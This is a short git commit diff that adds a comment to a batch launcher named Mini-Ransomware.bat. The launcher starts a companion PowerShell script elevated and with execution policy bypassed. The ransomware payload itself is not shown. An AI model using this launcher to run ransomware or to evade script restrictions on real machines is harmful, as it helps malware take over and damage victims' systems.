afce853c3b5829f4f1699f23364a313c47c7f7f5
Praneeth Marella <praneethmarella@icloud.com>
2017-07-14 09:29:41 -0600

    Added comment

--- Mini-Ransomware.bat
+++ Mini-Ransomware.bat
@@ -1,3 +1,5 @@
+//Bypass pwershell execution policy
+
 @ECHO OFF
 PowerShell.exe -NoProfile -Command "& {Start-Process PowerShell.exe -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%~dpn0.ps1""' -Verb RunAs}"
 PAUSE
